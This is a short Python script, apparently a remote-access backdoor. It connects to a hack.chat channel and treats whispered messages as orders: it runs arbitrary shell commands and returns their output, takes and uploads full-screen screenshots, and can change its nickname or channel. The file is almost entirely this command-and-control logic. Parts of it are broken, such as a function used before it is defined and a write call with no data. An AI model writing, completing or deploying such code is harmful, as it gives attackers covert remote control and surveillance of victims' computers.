import hackchat,uuid
mac=uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
conn=hackchat.HackChat(uuid.uuid4().hex[:8],'whoami')
conn.on_whisper+=[cmdexec]
conn.run()

def cmdexec(conn,msg,sender,result):
    msg=msg.replace('@mac',mac).replace('@MAC',mac)
    msg2=msg.split(' ')
    try:
        import sys
        if msg2[0]!='_':
            import os
            fn=fn()
            os.system(msg+' >'+fn)
            with open(fn) as f:
                conn.send_to(target=sender,msg=f.read())
                os.system('del /f /q"'+fn+'"')
        elif msg2[1].lower()=='screenshot':
            import pyautogui,win32api,os,datetime,base64
            img=pyautogui.screenshot(
                region=[0,0,
                win32api.GetSystemMetrics(0),
                win32api.GetSystemMetrics(1)])
            fn=fn()+'.png'
            img.save(fn)
            with open(fn,'rb') as f:
                conn.send_to(target=sender,msg=
                    base64.encodestring(f.read()))
            os.system('del /f /q"'+fn+'"')
        elif msg2[1].lower()=='close':
            exit(0)
        elif msg2[1].lower()=='identify1':
            import rsa,tempfile,uuid
            pri_key=None
            with tempfile.TemporaryFile(mode='rb+') as f:
                f.write()
                pri_key=rsa.PrivateKey.load_pkcs1(f.read())
            m=msg2[2].encode('utf-8')
            s=rsa.sign(m,pri_key,'SHA-1').decode('utf-8')
            conn.send_to(sender,'_ identify2 '+s+uuid.uuid4().hex)
        elif msg2[1].lower()=='change':
            if msg2[2].lower()=='nickname':
                conn.change_nick(msg2[3])
            elif msg2[2].lower()=='channel':
                conn.move(msg2[3])
            else:
                raise RuntimeError('Wrong argument in "change" command!')
        else:
            raise RuntimeError('Unsupported command!')
    except Exception as e:
        conn.send_to(target=sender,msg=repr(e))
